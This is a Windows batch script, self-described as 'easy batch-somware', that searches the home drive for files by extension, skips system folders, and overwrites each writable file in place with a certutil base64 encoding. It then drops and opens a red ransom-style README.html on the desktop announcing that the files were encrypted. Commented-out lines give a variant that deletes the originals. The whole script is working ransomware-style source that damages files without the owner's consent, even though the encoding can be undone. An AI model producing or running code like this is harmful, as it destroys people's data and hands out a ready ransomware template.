@echo off
setlocal enabledelayedexpansion
set /a cnt=0
set "fileExtension=*.ext1 *.ext2 *.ext3"
for /r "%homedrive%\" %%i in (*%fileExtension%) do (
    set "filePath=%%i"
    set "filePath=!filePath:\=!"
    if /i not "!filePath:windows=!"=="!filePath!" (
        echo Skipping Windows directory: !filePath!
    ) else if /i not "!filePath:appdata=!"=="!filePath!" (
        echo Skipping AppData directory: !filePath!
    ) else if /i not "!filePath:program files=!"=="!filePath!" (
        echo Skipping Program Files directory: !filePath!
    ) else (
        echo File found: %%i
		for %%f in ("%%i") do set "fileSize=%%~Zf"
		if !fileSize! equ 0 (
			echo skip:       %%i 
		) else (
		icacls %filename% | findstr /R ("%username%".*F)
		:: параметр /C не работает
		if %errorlevel% equ 0 (
			certutil -f -encode "%%i" "%%i" >nul
			::certutil -f -encode "%%i" "%%i.brsm" >nul
			::echo "%%i.brsm"
			::del /F /Q  "%%i" >nul	
			set /a cnt+=1
			rem альтернатива - создание зашифрованной копии, требуется ("%username%".*M) вместо ("%username%".*F) на 20-й строке 
			::copy /Y "%%i.brsm" "%%i"
			::del /F /Q "%%i.brsm"
			
		) else (
			echo no access to "%%i"
		)
		)
    )
)
if %cnt% NEQ 0 (
	echo %cnt% files have been encrypted, starting message
	echo ^<html^>^<head^>^<title^>RSM.MSG^</title^> ^<style^> #texto2{padding-top: 2%; letter-spacing: 2px; text-align: center;}^</style^>^</head^> > "%userprofile%\Desktop\README.html"
	echo ^<body bgcolor="#FF3333" scroll="no"^> ^<font face="Lucida Console" size="4" color="white"^> ^<br^>^<br^>^<br^> >> "%userprofile%\Desktop\README.html"
	echo ^<center^>^<p^> - easy batch-somware - ^</p^>^</center^> ^<div id="texto2"^> ^<img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100"^> >> "%userprofile%\Desktop\README.html"
	echo ^<br^>^<br^>^<br^> Oh, my. It looks like %cnt% of your files were encrypted!^<br^>^<br^>^<br^> >> "%userprofile%\Desktop\README.html"
	echo Not cool, but you can restore your %fileExtension% files using "certutil". ^<br^>^<br^> Be careful next time! ^</body^>^</html^> >> "%userprofile%\Desktop\README.html"
	start "" "%userprofile%\Desktop\README.html"
) else (
   echo no files have been encrypted, exiting
)
pause >nul
